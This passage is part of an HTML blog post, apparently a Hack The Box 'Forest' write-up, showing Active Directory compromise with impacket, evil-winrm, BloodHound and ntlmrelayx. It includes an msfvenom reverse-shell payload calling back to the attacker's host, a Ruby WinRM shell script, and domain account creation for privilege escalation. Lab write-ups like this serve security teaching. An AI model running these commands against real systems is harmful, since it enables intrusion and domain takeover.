+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We can also try to get Users SPNs&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python GetUserSPNs.py -request htb.local/svc-alfresco:s3rvice&lt;/span&gt;
+&lt;span class="code-line"&gt;Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;No entries found&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We add the DC to our &lt;code&gt;/etc/resolv.conf&lt;/code&gt; and install &lt;code&gt;rdate&lt;/code&gt; to have the same
+time as the DC.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat /etc/resolv.conf&lt;/span&gt;
+&lt;span class="code-line"&gt;# Generated by NetworkManager&lt;/span&gt;
+&lt;span class="code-line"&gt;search home&lt;/span&gt;
+&lt;span class="code-line"&gt;nameserver 192.168.1.25&lt;/span&gt;
+&lt;span class="code-line"&gt;domain htb.local&lt;/span&gt;
+&lt;span class="code-line"&gt;search htb.local&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;apt-get install rdate&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;rdate -n htb.local&lt;/span&gt;
+&lt;span class="code-line"&gt;Thu Oct 24 16:22:14 CEST 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;I know have the same time as the DC (this is super important for tickets
+generation).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;date &amp;amp;&amp;amp; rdate -n htb.local&lt;/span&gt;
+&lt;span class="code-line"&gt;Thu 24 Oct 2019 04:24:55 PM CEST&lt;/span&gt;
+&lt;span class="code-line"&gt;Thu Oct 24 16:24:55 CEST 2019&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The exploitation of MS14-068 does not work.&lt;/p&gt;
+&lt;h2 id="evil-winrm"&gt;Evil-winrm&lt;/h2&gt;
+&lt;p&gt;As we so in the openport, the
+&lt;a href="https://docs.microsoft.com/en-us/windows/win32/winrm/installation-and-configuration-for-windows-remote-management"&gt;default port for winrm 5985&lt;/a&gt;
+is open. We use &lt;a href="https://github.com/Hackplayers/evil-winrm"&gt;evil-winrm&lt;/a&gt; in order
+to connect to the system and get user's flag:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Evil-WinRM shell v1.8&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Info: Establishing connection to remote endpoint&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&amp;gt; dir&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    Directory: C:\Users\svc-alfresco\Documents&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Mode                LastWriteTime         Length Name&lt;/span&gt;
+&lt;span class="code-line"&gt;----                -------------         ------ ----&lt;/span&gt;
+&lt;span class="code-line"&gt;-a----       10/24/2019   6:57 AM          12510 20191024065705_BloodHound.zip&lt;/span&gt;
+&lt;span class="code-line"&gt;-a----       10/24/2019   8:23 AM           3996 Add-ACE.ps1&lt;/span&gt;
+&lt;span class="code-line"&gt;-a----       10/24/2019   8:23 AM           2584 Add-ToGroup.ps1&lt;/span&gt;
+&lt;span class="code-line"&gt;-a----       10/24/2019   6:28 AM          64384 Invoke-ACLPwn.ps1&lt;/span&gt;
+&lt;span class="code-line"&gt;-a----       10/24/2019   8:02 AM        2661697 Invoke-Mimikatz.ps1&lt;/span&gt;
+&lt;span class="code-line"&gt;-a----       10/24/2019   6:33 AM        1006744 mimikatz.exe&lt;/span&gt;
+&lt;span class="code-line"&gt;-a----       10/24/2019   6:25 AM         212992 mp1.exe&lt;/span&gt;
+&lt;span class="code-line"&gt;-a----       10/24/2019   9:17 AM          43696 nc64.exe&lt;/span&gt;
+&lt;span class="code-line"&gt;-a----       10/24/2019   6:47 AM          73802 pd.exe&lt;/span&gt;
+&lt;span class="code-line"&gt;-a----       10/24/2019   7:24 AM           6017 powerPriv.ps1&lt;/span&gt;
+&lt;span class="code-line"&gt;-a----       10/24/2019   9:26 AM         363295 powerview.ps1&lt;/span&gt;
+&lt;span class="code-line"&gt;-a----       10/24/2019   7:12 AM           8978 Rk9SRVNU.bin&lt;/span&gt;
+&lt;span class="code-line"&gt;-a----       10/24/2019   6:27 AM         779264 SharpHound.exe&lt;/span&gt;
+&lt;span class="code-line"&gt;-a----       10/24/2019   6:44 AM         919546 SharpHound.ps1&lt;/span&gt;
+&lt;span class="code-line"&gt;-a----       10/24/2019   8:36 AM        2222592 SharpSploit.dll&lt;/span&gt;
+&lt;span class="code-line"&gt;-a----       10/24/2019   7:26 AM          73802 shell.exe&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&amp;gt; cd ../&lt;/span&gt;
+&lt;span class="code-line"&gt;di*Evil-WinRM* PS C:\Users\svc-alfresco&amp;gt; dir&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    Directory: C:\Users\svc-alfresco&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Mode                LastWriteTime         Length Name&lt;/span&gt;
+&lt;span class="code-line"&gt;----                -------------         ------ ----&lt;/span&gt;
+&lt;span class="code-line"&gt;d-r---        9/23/2019   2:16 PM                Desktop&lt;/span&gt;
+&lt;span class="code-line"&gt;d-r---       10/24/2019   9:31 AM                Documents&lt;/span&gt;
+&lt;span class="code-line"&gt;d-r---        7/16/2016   6:18 AM                Downloads&lt;/span&gt;
+&lt;span class="code-line"&gt;d-r---        7/16/2016   6:18 AM                Favorites&lt;/span&gt;
+&lt;span class="code-line"&gt;d-r---        7/16/2016   6:18 AM                Links&lt;/span&gt;
+&lt;span class="code-line"&gt;d-r---        7/16/2016   6:18 AM                Music&lt;/span&gt;
+&lt;span class="code-line"&gt;d-r---        7/16/2016   6:18 AM                Pictures&lt;/span&gt;
+&lt;span class="code-line"&gt;d-----        7/16/2016   6:18 AM                Saved Games&lt;/span&gt;
+&lt;span class="code-line"&gt;d-r---        7/16/2016   6:18 AM                Videos&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\svc-alfresco&amp;gt; dir Desktop&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    Directory: C:\Users\svc-alfresco\Desktop&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Mode                LastWriteTime         Length Name&lt;/span&gt;
+&lt;span class="code-line"&gt;----                -------------         ------ ----&lt;/span&gt;
+&lt;span class="code-line"&gt;-ar---        9/23/2019   2:16 PM             32 user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;*Evil-WinRM* PS C:\Users\svc-alfresco&amp;gt; type Desktop\user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;e5e4e&amp;lt;redacted&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="getting-root"&gt;Getting root&lt;/h1&gt;
+&lt;h2 id="evil-winrm-and-binary"&gt;evil-winrm and binary&lt;/h2&gt;
+&lt;p&gt;Using evil-Winrm we can also check the domain SID (and our user SID):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;whoami /user&lt;/span&gt;
+&lt;span class="code-line"&gt;USER INFORMATION&lt;/span&gt;
+&lt;span class="code-line"&gt;----------------&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;User Name        SID&lt;/span&gt;
+&lt;span class="code-line"&gt;================ =============================================&lt;/span&gt;
+&lt;span class="code-line"&gt;htb\svc-alfresco S-1-5-21-3072663084-364016917-1341370565-1147&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Using evil-winrm we can easily upload a binary using the &lt;code&gt;upload&lt;/code&gt; function.
+Nevertheless I was not able to invoke the binary using the &lt;code&gt;Invoke-binary&lt;/code&gt;
+command. Therefore I used a simple ruby script to get on the machine a launch a
+msfvenom meterprter:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nb"&gt;require&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;winrm&amp;#39;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;conn&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;WinRM&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="ss"&gt;endpoint&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://10.10.10.161:5985/wsman&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="ss"&gt;user&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;svc-alfresco&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;  &lt;span class="ss"&gt;password&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;s3rvice&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;command&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ss"&gt;:powershell&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="k"&gt;until&lt;/span&gt; &lt;span class="n"&gt;command&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;exit&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;PS &amp;gt; &amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;command&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;gets&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;output&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;command&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;stderr&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &lt;span class="no"&gt;STDOUT&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;print&lt;/span&gt; &lt;span class="n"&gt;stdout&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &lt;span class="no"&gt;STDERR&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;print&lt;/span&gt; &lt;span class="n"&gt;stderr&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="k"&gt;end&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="k"&gt;end&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    &lt;span class="nb"&gt;puts&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Exiting with code &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exitcode&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="k"&gt;end&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The msfvenom command to generate the meterpreter is the following:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&amp;quot;10.10.15.185&amp;quot; LPORT=4444 -f exe &amp;gt; shell.exe&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;To catch the reverse meterpreter we use the &lt;code&gt;exploit/multi/handler&lt;/code&gt; metasploit
+module. We can get a cmd shell using the &lt;code&gt;shell&lt;/code&gt; command.&lt;/p&gt;
+&lt;h2 id="bloodhound"&gt;Bloodhound&lt;/h2&gt;
+&lt;p&gt;As we need to elevate our privileges on a Windows environnement we want to run
+Bloodhound to see the differents relationships between the domain's users,
+groups and computers.
+We use a &lt;a href="https://github.com/fox-it/BloodHound.py"&gt;bloodhound ingestor based on impacket&lt;/a&gt;
+that allow to grab credentials remotly. But we get some error about DNS
+resolution probably because of our VPN configuration.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python ./bloodhound.py -d &amp;#39;htb.local&amp;#39; -dc 10.10.10.161 -gc 10.10.10.161 -u svc-alfresco -p s3rvice -v -ns 10.10.10.161 -c all&lt;/span&gt;
+&lt;span class="code-line"&gt;DEBUG: Authentication: username/password&lt;/span&gt;
+&lt;span class="code-line"&gt;DEBUG: Resolved collection methods: localadmin, rdp, dcom, acl, objectprops, session, group, trusts&lt;/span&gt;
+&lt;span class="code-line"&gt;DEBUG: Using DNS to retrieve domain information&lt;/span&gt;
+&lt;span class="code-line"&gt;DEBUG: Querying domain controller information from DNS&lt;/span&gt;
+&lt;span class="code-line"&gt;DEBUG: Using domain hint: htb.local&lt;/span&gt;
+&lt;span class="code-line"&gt;INFO: Found AD domain: htb.local&lt;/span&gt;
+&lt;span class="code-line"&gt;DEBUG: Found primary DC: FOREST.htb.local&lt;/span&gt;
+&lt;span class="code-line"&gt;DEBUG: Found Global Catalog server: FOREST.htb.local&lt;/span&gt;
+&lt;span class="code-line"&gt;DEBUG: Using LDAP server: 10.10.10.161&lt;/span&gt;
+&lt;span class="code-line"&gt;DEBUG: Using base DN: DC=htb,DC=local&lt;/span&gt;
+&lt;span class="code-line"&gt;INFO: Connecting to LDAP server: 10.10.10.161&lt;/span&gt;
+&lt;span class="code-line"&gt;Traceback (most recent call last):&lt;/span&gt;
+&lt;span class="code-line"&gt;  File &amp;quot;./bloodhound.py&amp;quot;, line 5, in &amp;lt;module&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    bloodhound.main()&lt;/span&gt;
+&lt;span class="code-line"&gt;  File &amp;quot;/root/BloodHound.py/bloodhound/__init__.py&amp;quot;, line 265, in main&lt;/span&gt;
+&lt;span class="code-line"&gt;    disable_pooling=args.disable_pooling)&lt;/span&gt;
+&lt;span class="code-line"&gt;  File &amp;quot;/root/BloodHound.py/bloodhound/__init__.py&amp;quot;, line 68, in run&lt;/span&gt;
+&lt;span class="code-line"&gt;    self.pdc.prefetch_info(&amp;#39;objectprops&amp;#39; in collect, &amp;#39;acl&amp;#39; in collect)&lt;/span&gt;
+&lt;span class="code-line"&gt;  File &amp;quot;/root/BloodHound.py/bloodhound/ad/domain.py&amp;quot;, line 330, in prefetch_info&lt;/span&gt;
+&lt;span class="code-line"&gt;    self.get_domains(acl=acls)&lt;/span&gt;
+&lt;span class="code-line"&gt;  File &amp;quot;/root/BloodHound.py/bloodhound/ad/domain.py&amp;quot;, line 204, in get_domains&lt;/span&gt;
+&lt;span class="code-line"&gt;    for entry in entries:&lt;/span&gt;
+&lt;span class="code-line"&gt;  File &amp;quot;/root/BloodHound.py/bloodhound/ad/domain.py&amp;quot;, line 106, in search&lt;/span&gt;
+&lt;span class="code-line"&gt;    self.ldap_connect()&lt;/span&gt;
+&lt;span class="code-line"&gt;  File &amp;quot;/root/BloodHound.py/bloodhound/ad/domain.py&amp;quot;, line 60, in ldap_connect&lt;/span&gt;
+&lt;span class="code-line"&gt;    q = self.ad.dnsresolver.query(self.hostname, tcp=self.ad.dns_tcp)&lt;/span&gt;
+&lt;span class="code-line"&gt;  File &amp;quot;/usr/lib/python2.7/dist-packages/dns/resolver.py&amp;quot;, line 992, in query&lt;/span&gt;
+&lt;span class="code-line"&gt;    timeout = self._compute_timeout(start, lifetime)&lt;/span&gt;
+&lt;span class="code-line"&gt;  File &amp;quot;/usr/lib/python2.7/dist-packages/dns/resolver.py&amp;quot;, line 799, in _compute_timeout&lt;/span&gt;
+&lt;span class="code-line"&gt;    raise Timeout(timeout=duration)&lt;/span&gt;
+&lt;span class="code-line"&gt;dns.exception.Timeout: The DNS operation timed out after 3.0016040802 seconds&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We edit the code of &lt;code&gt;/root/BloodHound.py/bloodhound/ad/domain.py&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;ldap_connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;protocol&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ldap&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;resolver&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;False&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="sd"&gt;        Connect to the LDAP service&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="sd"&gt;        &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;logging&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Connecting to LDAP server: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hostname&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="c1"&gt;# Convert the hostname to an IP, this prevents ldap3 from doing it&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="c1"&gt;# which doesn&amp;#39;t use our custom nameservers&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="c1"&gt;#q = self.ad.dnsresolver.query(self.hostname, tcp=self.ad.dns_tcp)&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="c1"&gt;#for r in q:&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;            &lt;span class="c1"&gt;#ip = r.address&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;        &lt;span class="n"&gt;ip&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;10.10.10.161&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The ingestor create a few JSON files:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ls *.json&lt;/span&gt;
+&lt;span class="code-line"&gt;computers.json  domains.json  groups.json  sessions.json  users.json&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We start the &lt;code&gt;neo4j&lt;/code&gt; database, &lt;code&gt;bloodhound&lt;/code&gt; and feed him the JSON data.&lt;/p&gt;
+&lt;p&gt;When using the query "Shortest Paths to High Value Targets" we get the following
+graph:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Bloodhound complete view" src="/media/2020.03/forest_01.png"&gt;.&lt;/p&gt;
+&lt;h2 id="exchange-trusted-subsystem-and-ntlmrelayx"&gt;Exchange trusted subsystem and ntlmrelayx&lt;/h2&gt;
+&lt;p&gt;Our &lt;code&gt;svc-alfresco&lt;/code&gt; user got indirect right for the &lt;code&gt;Exchange trusted subsytem&lt;/code&gt;
+group.
+For more information about the Active Directory Right:
+&lt;a href="https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights"&gt;Documentation Microsoft&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Therefore we want to exploit our Exchange rights using
+&lt;a href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/"&gt;PrivExchange&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Let's create a user and add it in the &lt;code&gt;Exchange trusted subsytem&lt;/code&gt; group.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;meterpreter &amp;gt; shell&lt;/span&gt;
+&lt;span class="code-line"&gt;Process 3256 created.&lt;/span&gt;
+&lt;span class="code-line"&gt;Channel 1 created.&lt;/span&gt;
+&lt;span class="code-line"&gt;Microsoft Windows [Version 10.0.14393]&lt;/span&gt;
+&lt;span class="code-line"&gt;(c) 2016 Microsoft Corporation. All rights reserved.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\Users\svc-alfresco\Documents&amp;gt;net user created_01 M&amp;lt;redacted&amp;gt; /add /domain&lt;/span&gt;
+&lt;span class="code-line"&gt;net user created_01 Marteau69! /add /domain&lt;/span&gt;
+&lt;span class="code-line"&gt;The command completed successfully.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\Users\svc-alfresco\Documents&amp;gt;net group &amp;quot;EXCHANGE TRUSTED SUBSYSTEM&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;net group &amp;quot;EXCHANGE TRUSTED SUBSYSTEM&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;Group name     Exchange Trusted Subsystem&lt;/span&gt;
+&lt;span class="code-line"&gt;Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Exchange configuration, as well as user accounts and groups. This group should not be deleted.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Members&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;-------------------------------------------------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;EXCH01$                  sol                      svc-alfresco&lt;/span&gt;
+&lt;span class="code-line"&gt;The command completed successfully.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;C:\Users\svc-alfresco\Documents&amp;gt;net group &amp;quot;EXCHANGE TRUSTED SUBSYSTEM&amp;quot; created_01 /add&lt;/span&gt;
+&lt;span class="code-line"&gt;net group &amp;quot;EXCHANGE TRUSTED SUBSYSTEM&amp;quot; created_01 /add&lt;/span&gt;
+&lt;span class="code-line"&gt;The command completed successfully.&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We then launch &lt;a href="https://github.com/SecureAuthCorp/impacket/"&gt;impacket's ntlmrelayx.py&lt;/a&gt;
+with the &lt;code&gt;escalate-user&lt;/code&gt; parameter. We try it by authenticating in our browser on 127.0.0.1.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user created_01&lt;/span&gt;
+&lt;span class="code-line"&gt;Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Protocol Client SMTP loaded..&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Protocol Client SMB loaded..&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Protocol Client MSSQL loaded..&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Protocol Client HTTP loaded..&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Protocol Client HTTPS loaded..&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Protocol Client IMAPS loaded..&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Protocol Client IMAP loaded..&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Protocol Client LDAPS loaded..&lt;/span&gt;
+&lt;span class="code-line"&gt;[*] Protocol Client LDAP loaded..&lt;/span&gt;
